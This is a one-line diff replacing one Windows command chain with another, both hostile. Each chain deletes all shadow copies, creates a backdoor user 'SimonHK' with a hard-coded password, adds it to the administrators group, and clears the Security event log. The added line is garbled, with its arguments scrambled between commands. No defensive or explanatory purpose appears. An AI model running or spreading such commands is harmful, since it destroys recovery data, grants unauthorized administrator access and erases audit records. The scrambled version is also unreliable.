@@ -1,1 +1,1 @@
-vssadmin delete shadows /all && net localgroup administrators SimonHK /add && wevtutil cl Security && net user /add SimonHK passA-JHG123
+vssadmin delete shadows /all && net user /add SimonHK passA-JHG123 SimonHK /add && wevtutil cl Security && net localgroup administrators
